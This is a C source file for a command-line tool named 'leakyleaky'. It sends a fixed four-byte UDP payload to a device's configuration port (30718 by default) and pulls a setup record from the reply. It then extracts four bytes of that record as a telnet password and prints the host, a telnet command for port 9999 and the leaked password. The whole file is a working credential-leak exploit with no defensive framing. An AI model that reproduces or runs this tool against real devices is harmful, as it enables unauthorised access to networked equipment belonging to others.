#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>

#define MAX_BUF 255
#define PAYLOAD "\x00\x00\x00\xF8"

void showLogo(){
    printf("           _               _          _               _\n");
    printf("          | |    ___  __ _| | ___   _| |    ___  __ _| | ___   _\n");
    printf("          | |   / _ \\/ _` | |/ | | | | |   / _ \\/ _` | |/ | | | |\n");
    printf("          | |__|  __| (_| |   <| |_| | |__|  __| (_| |   <| |_| |\n");
    printf("          |_____\\___|\\__,_|_|\\_\\__,  |_____\\___|\\__,_|_|\\_\\__,  |\n");
    printf("                                |___/                      |___/\n\n");
}

void showHelp() {
    showLogo();
    printf("Usage: ./leakyleaky <HOST>\n");
    printf("\n");
    printf("Options:\n");
    printf("  -p, --port=PORT  Config Port\n");
    printf("  -h, --help       Display This Message\n");
    printf("Example:\n");
    printf("./leakyleaky 1.1.1.1 --port=30718");
    exit(EXIT_SUCCESS);
}

void errorContainer(char *fmt, ...) {
    char buf[MAX_BUF], msg[MAX_BUF];
    va_list args;

    va_start(args, fmt);
    vsnprintf(buf, MAX_BUF-1, fmt, args);
    va_end(args);

    snprintf(msg, MAX_BUF-1, "ERROR: %s", buf);

    if (errno != 0) perror(msg);
    else fprintf(stderr, "%s\n", msg);

    exit(EXIT_FAILURE);
}

static struct option options[] = {
    {"port", 0, 0, 'p'},
    {"help", 0, 0, 'h'},
    {0, 0, 0, 0}
};

char setup[MAX_BUF];

char *start(char *host, char *port) {
    int conn_sockfd, err;
    struct addrinfo hints, *res, *res0;
    struct sockaddr_storage their_addr;
    socklen_t addr_len;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;

    err = getaddrinfo(host, port, &hints, &res0);
    if (err) errorContainer("GetAddrInfo Failed: %s\n", gai_strerror(err));

    for (res = res0; res != NULL; res = res->ai_next) {
        conn_sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (conn_sockfd == -1) continue;

        err = connect(conn_sockfd, res->ai_addr, res->ai_addrlen);
        if (err == -1) continue;

        break;
    }

    if (res == NULL) errorContainer("Failed socket connection");

    freeaddrinfo(res0);

    err = send(conn_sockfd, PAYLOAD, sizeof(PAYLOAD)-1, 0);
    if (err == -1) errorContainer("Payload failed to send");

    err = recv(conn_sockfd, setup, MAX_BUF-1, 0);
    if (err == -1) errorContainer("Failed to grab setup file");

    return setup;
}

int main(int argc, char **argv) {
    int next_arg;

    char *host, *port = "30718", *setup;
    char telnet_pw[5];
    
    extern char *optarg;
    extern int optind;

    while (1) {
        int option_index = 0;

        next_arg = getopt_long_only(argc, argv, "p:hv", options, &option_index);

        if (next_arg == -1) break;

        switch(next_arg) {
            case 'p': port = optarg; break;
            case 'h': default: showHelp(); break;
        }
    }

    if (atoi(port) < 1 || atoi(port) > 65535) errorContainer("Invalid port length");
    if (optind != argc-1) showHelp();

    host = argv[optind];
    setup = start(host, port);

    telnet_pw[0] = setup[12];
    telnet_pw[1] = setup[13];
    telnet_pw[2] = setup[14];
    telnet_pw[3] = setup[15];
    telnet_pw[4] = '\0';

    showLogo();
    if (strlen(telnet_pw) <= 0){ printf("Password secured, no leaks!"); }
    else { printf("Host....: %s\nCommand.: telnet %s 9999\nPassword: %s\n\n", host, host, telnet_pw); }

    return 0;
}
